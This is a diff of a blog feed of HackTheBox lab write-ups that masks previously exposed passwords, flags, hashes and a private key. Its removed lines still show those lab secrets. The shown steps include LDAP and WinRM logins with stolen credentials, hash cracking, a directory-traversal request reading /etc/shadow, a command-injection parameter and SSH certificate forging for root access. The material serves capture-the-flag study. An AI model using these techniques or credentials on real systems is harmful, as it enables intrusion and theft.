@@ -749,7 +749,7 @@ SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC 
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser
 </code></pre></div><p>Trying the usernames i found that the correct one was <strong>michael.wrightson</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada**********&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
 </code></pre></div><ol>
 <li>
 <p><strong><code>ldapsearch</code></strong>: This is the command-line utility used to search an LDAP directory.</p>
@@ -797,7 +797,7 @@ $sourceDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74
 $destinationDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;D:\Backup&#34;</span>
 
 $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily.oscars&#34;</span>
-$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> -AsPlainText -Force
+$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp*******&#34;</span> -AsPlainText -Force
 $credentials <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span>$username, $password<span style="color:#f92672">)</span>
 $dateStamp <span style="color:#f92672">=</span> Get-Date -Format <span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>
 $backupFileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;smb_backup_</span>$dateStamp<span style="color:#e6db74">.zip&#34;</span>
@@ -833,9 +833,9 @@ smb: <span style="color:#ae81ff">\&gt;</span>
 
 </code></pre></div><p>Navigate to emily.oscars' Desktop folder and you&rsquo;ll find the user flag:</p>
 <p><img src="attachment/eb966126c503e2aac24c0c3b2378726a.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:b1a85553011c051272b8b9bbf05a7258
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:b1a85553011************
 </code></pre></div><p>Use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to log in the system</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i cicada.htb -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -s /path/to/local/Winpeas.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i cicada.htb -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@L*****&#39;</span> -s /path/to/local/Winpeas.exe
 </code></pre></div><p><img src="attachment/9795d07b42e23b355bb6731828e14690.png" alt=""></p>
 <p><img src="attachment/c8d3469c66416e2e25100a64545dbb13.png" alt="">
 With crackmapexec we can dump the SAM database:</p>
@@ -874,7 +874,7 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</spa
 </code></pre></div><p><img src="attachment/6c4e7fc15c5e909ebca94f90ff258d6e.png" alt=""></p>
 <p>Then get root.txt in <strong>C:\Users\Administrator\Desktop&gt;</strong></p>
 <p><img src="attachment/1b649ffb4e75f05397d31a254f89ee84.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:03875ddc5ded5559275b9be9ca9d0dd3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:03875ddc5ded55********
 </code></pre></div>]]></content>
         </item>
         
@@ -1052,10 +1052,10 @@ _space_group_magn<span style="color:#f92672">.</span>name_BNS  <span style="colo
 <p><img src="attachment/a07416b7d39814bf65a972ab67ce98cb.png" alt=""></p>
 <p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:</p>
 <p><img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
-<pre tabindex="0"><code>rosa:63ed86ee9f624c7b14f1d4f43dc251a5
+<pre tabindex="0"><code>userflag:63ed86e********
 </code></pre><p>After cracking the MD5 hash on CrackStation, I obtained the following plaintext password:</p>
 <p><img src="attachment/d2fe7632ffcd0ede2092fc06eb355cca.png" alt=""></p>
-<pre tabindex="0"><code>rosa:unicorniosrosados
+<pre tabindex="0"><code>rosa:u**********
 </code></pre><h3 id="ssh-access">SSH Access</h3>
 <p>With the cracked credentials, I attempted to establish an SSH connection to the machine as the user rosa. This provided access to additional internal services. Port Forwarding and Service Exploration</p>
 <p>After connecting via SSH, I noticed an internal service running on port 8080, which wasn’t directly exposed externally.</p>
@@ -1075,7 +1075,8 @@ Through this vulnerability we can get the root flag:</p>
 <p>The service running on port 8080 uses aiohttp version 3.9.1, which is vulnerable to a directory traversal attack: <strong><a href="https://github.com/ox1111/CVE-2024-23334">CVE-2024-23334</a></strong>. By exploiting this vulnerability, I was able to retrieve the root flag directly from the server: I also used this directory traversal method to access the /etc/shadow file, which contained hashed passwords for further analysis. Summary and Next Steps</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 └─$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
-6401b9e5a23e0b20fecead6965d9f51e
+6401b9e5a23e0b******
+
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 └─$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow
 root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
@@ -1178,14 +1179,14 @@ listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">
 <p>There&rsquo;s a file sqlpad.sqlite:
 <img src="attachment/9ee6825e92c38020c4d8b7f7fbb9f070.png" alt=""></p>
 <p>In this file are present some interesting parts:</p>
-<pre tabindex="0"><code>admin@sightless.htbadmin$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">admin@sightless.htbadmin$2a$10$cjbITibC.********.
 ����1john@sightless.htb3        admin@sightless.htb
-</code></pre><p>Meanwhile try to run a linpeas on sqlpad machine:
+</code></pre></div><p>Meanwhile try to run a linpeas on sqlpad machine:
 <img src="attachment/cb5e7e14d62ecb6a8111c1d31d0440bd.png" alt=""></p>
 <p><img src="attachment/a0f88f95ba5694f4e5d41dc034b8ce87.png" alt=""></p>
 <p>There&rsquo;s an hash for user <strong>micheal</strong> in passwd file:</p>
-<pre tabindex="0"><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7::
-</code></pre><p>Try to crack it with hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">michael:$6$mG3Cp2VPGY.********:19860:0:99999:7::
+</code></pre></div><p>Try to crack it with hashcat:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
 └─$ <span style="color:#75715e"># Example command for Hashcat</span>
 hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> -o cracked_micheal_hash.txt micheal_user_hash /usr/share/wordlists/rockyou.txt
@@ -1242,29 +1243,29 @@ Stopped: Sat Oct <span style="color:#ae81ff">19</span> 08:58:49 <span style="col
 
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
 └─$ cat cracked_micheal_hash.txt 
-$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
+$6$mG3Cp2VPGY.********:********
 
 
 </code></pre></div><p>Try ssh into <strong>michael</strong>:</p>
 <p><img src="attachment/e86b9c94c5913aea4b70e9b7e3fb03cc.png" alt=""></p>
-<pre tabindex="0"><code>userflag:9dc449a3cd76e16166ea0ae08bd65880
-</code></pre><p>By analyzing services running on port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:9dc449a3********
+</code></pre></div><p>By analyzing services running on port:</p>
 <p><img src="attachment/c6a62ceea6e4a4ba4721657b76a164e5.png" alt=""></p>
 <p>During ports forwarding trough SSH i found that there&rsquo;s froxlor running on 8080, but isn&rsquo;t reachable due the missing of it&rsquo;s domain name. Inspecting other ports i found that port 40975 is the port of an available chrome debugger:</p>
 <p><img src="attachment/91d6ba2807b9fbb33ce0dc23bd8ee157.png" alt=""></p>
 <p><img src="attachment/70fff9de0a46ccc3364d2458727d946c.png" alt=""></p>
-<pre tabindex="0"><code>admin:ForlorfroxAdmin
-</code></pre><p><img src="attachment/46aef148daacdeee888551a751e330d5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">admin:F********
+</code></pre></div><p><img src="attachment/46aef148daacdeee888551a751e330d5.png" alt=""></p>
 <p><img src="attachment/82f88746687d4741f0f013bf84f1f829.png" alt=""></p>
 <p>After saving the PHPFM configuration disable and enable this by settings panel after querying
 <code>http://127.0.0.1:8080/admin_settings.php?start=phpfpm</code></p>
 <p>Now redo this procedure with the chmod command on id_rsa file just copied:</p>
-<pre tabindex="0"><code>chmod 644 /tmp/id_rsa
-</code></pre><p><img src="attachment/51da7e56b9548e78bc8115eeb77b66b8.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chmod <span style="color:#ae81ff">644</span> /tmp/id_rsa
+</code></pre></div><p><img src="attachment/51da7e56b9548e78bc8115eeb77b66b8.png" alt=""></p>
 <p>After a bit the command will be executed and you will be able to use id_rsa to login into root&rsquo;s ssh:</p>
 <p><img src="attachment/b21470aaf193edff2e229c3637135c2c.png" alt=""></p>
-<pre tabindex="0"><code>rootflag: 7a2a1b4afb44130a744827929fe643d3
-</code></pre>]]></content>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag: 7a2a1b4afb4********
+</code></pre></div>]]></content>
         </item>
         
         <item>
@@ -1334,7 +1335,7 @@ $ cat db.php
 &lt;?php
 $dsn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql:host=db;dbname=resourcecenter;&#34;</span>;
 $dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jj&#34;</span>;
-$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ugEG5rR5SG8uPd&#34;</span>;
+$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ugEG5********&#34;</span>;
 $pdo <span style="color:#f92672">=</span> new PDO<span style="color:#f92672">(</span>$dsn, $dbusername, $dbpassword<span style="color:#f92672">)</span>;
 
 try <span style="color:#f92672">{</span>
@@ -1347,7 +1348,7 @@ try <span style="color:#f92672">{</span>
 This box looks always broken so i decided to look a writeup and found out that should be present a file in /uploads folder of itrc that i don&rsquo;t have:</p>
 <p><img src="attachment/836cab1aee6922d645e447bf11a51d46.png" alt=""></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Credentials:
-msainristil:82yards2closeit
+msainristil:82********
 </code></pre></div><p><img src="attachment/334f5c9284c02ea18b054c4959331e94.png" alt=""></p>
 <p>In the decommisions_old_ca folder there is priv/pub key pair, that we are going to convert into ssh keys.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh-keygen -t rsa -b <span style="color:#ae81ff">2048</span> -f keypair
@@ -1383,11 +1384,7 @@ root@itrc:~# ls
 </code></pre></div><p>From a writeup (i needed help) i recover this key that we will use a certificate to generate root ssh-key. Pasted it in root_ssh.cert file</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
-QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc 
-rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ 
-AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA 
-cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV 
-QBAgM<span style="color:#f92672">=</span>
+.......
 -----END OPENSSH PRIVATE KEY-----
 </code></pre></div><p>Then login as root on your kali and sign a the private key using this certificate i provided</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HTB/Resource/zzinter_keys<span style="color:#f92672">]</span>
@@ -1412,8 +1409,8 @@ ssh-keygen -s root_ssh.cert -z <span style="color:#ae81ff">1</span> -I root -V -
 <p>The resulting certificate is stored in <code>keypair-cert.pub</code>.</p>
 <p><strong>Flags</strong></p>
 <p><img src="attachment/d9314cee50c28c2118e10e586b1ea6b8.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user: 98a79086fe46218a7edd6abc87eb54f3
-root: 495f767f17cf87214179384c1f145b91
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user: 98a79086fe4621************
+root: 495f767f17cf87************
 </code></pre></div>]]></content>
         </item>
         
@@ -1525,7 +1522,7 @@ $ cat database.js
         <span style="color:#e6db74">&#34;forceLogout&#34;</span>: false,
         <span style="color:#e6db74">&#34;forceHttps&#34;</span>: false,
         <span style="color:#e6db74">&#34;saveChangesPopup&#34;</span>: false,
-        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$iOrk210RQSAzNCx6Vyq2X<span style="color:#e6db74">.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q&#34;</span>,
+        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$iOrk210RQSA<span style="color:#e6db74">****************&#34;</span>,
         <span style="color:#e6db74">&#34;lastLogins&#34;</span>: <span style="color:#f92672">{</span>
             <span style="color:#e6db74">&#34;2024\/08\/13 18:10:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
             <span style="color:#e6db74">&#34;2024\/08\/13 18:09:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
@@ -1536,10 +1533,10 @@ $ cat database.js
 
 
 </code></pre></div><p>Fix the hash provided removing the escapes obtaining this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$2y$10$iOrk****************
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sea<span style="color:#f92672">]</span>
 └─$ hashcat hash.txt -m <span style="color:#ae81ff">3200</span> /usr/share/wordlists/rockyou.txt
-$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+$2y$10$iOrk21****************:****************
                                                           
 Session..........: hashcat
 Status...........: Cracked
@@ -1588,8 +1585,8 @@ root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv
 <p>We can get the root flag directly</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">log_file<span style="color:#f92672">=</span>/root/root.txt;ls&amp;analyze_log<span style="color:#f92672">=</span>/root/root.txt
 </code></pre></div><p>**Flags</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user:459138e5dbf2ead0be8b9c7944a38af7
-root:c58fac10593819ba13ab985ab6389ce0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user:459138e5dbf2****************
+root:c58fac105938****************
 </code></pre></div>]]></content>
         </item>
         
@@ -1792,7 +1789,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span><span style="color:#ae81ff"></span>  http://2million.htb/api/v1/invite/generate <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{}&#39;</span>
-<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;N0VDWEYtQjFWU1UtVDNZSTktMTFMRFc=&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                                    
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;N0VDWEYt************&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                                    
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
 └─$
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
@@ -1800,9 +1797,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span><span style="color:#ae81ff"></span>  http://2million.htb/api/v1/invite/generate <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{}&#39;</span>
-<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                              
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;SFlKOUUtSDNQU************&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                              
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
-└─$ echo <span style="color:#e6db74">&#34;SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=&#34;</span> | base64 -d          
+└─$ echo <span style="color:#e6db74">&#34;SFlKOUUtSDN************&#34;</span> | base64 -d          
 HYJ9E-H3PSB-0HILZ-09HUU      
 
 </code></pre></div><h2 id="api-enumeration">API Enumeration</h2>
@@ -1909,16 +1906,16 @@ drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#a
 Cat the .env file:</p>
 <p><img src="attachment/76cd033960d09f1f9ebf70f4cbfa5501.png" alt=""></p>
 <p>Log in ssh with credentials</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh admin@10.10.11.221: SuperDuberPass123
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh admin@10.10.11.221: Su************
 </code></pre></div><p><img src="attachment/0127d0b1827447c60fa7afec74c2f32b.png" alt=""></p>
 <h3 id="privilege-escalation-cve-2023-0386">Privilege Escalation (CVE-2023-0386)</h3>
 <p>The <a href="https://github.com/xkaneiki/CVE-2023-0386">CVE-2023-0386</a> exploit was used to escalate privileges to root. This exploit enabled full control over the target system, concluding the penetration test with root access.
 This CVE will give you root access</p>
 <p><img src="attachment/3a2cb1f670e1d6bbaa01132a1090bf31.png" alt=""></p>
 <h3 id="flags">Flags</h3>
-<pre tabindex="0"><code>root:7dc68d17b543edb77d35bc192d63907a
-user:f62e9b661ecc6002193860132292c635
-</code></pre>]]></content>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root:7dc68d17************
+user:f62e9b66************
+</code></pre></div>]]></content>
         </item>
         
         <item>
@@ -2044,13 +2041,14 @@ reset_logs.sh
 root.txt
 vnc.log
 cat root.txt
-6118f8816315bd33ecac622d179c65af
-</code></pre></div><p><img src="attachment/95e2ca9714b079079c673225e5a17f15.png" alt=""><img src="attachment/e0218db999901f943bf934f889d0edec.png" alt=""></p>
+6118f881631**********
+</code></pre></div><p><img src="attachment/95e2ca9714b079079c673225e5a17f15.png" alt=""></p>
+<p><img src="attachment/e0218db999901f943bf934f889d0edec.png" alt=""></p>
 <h3 id="flags">Flags</h3>
-<pre tabindex="0"><code>root:6118f8816315bd33ecac622d179c65af
-user:15fd56e82fdefb166bfb1631b6c6360a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root:6118f8816315**********
+user:15fd56e82fde**********
 
-</code></pre>]]></content>
+</code></pre></div>]]></content>
         </item>
         
     </channel>
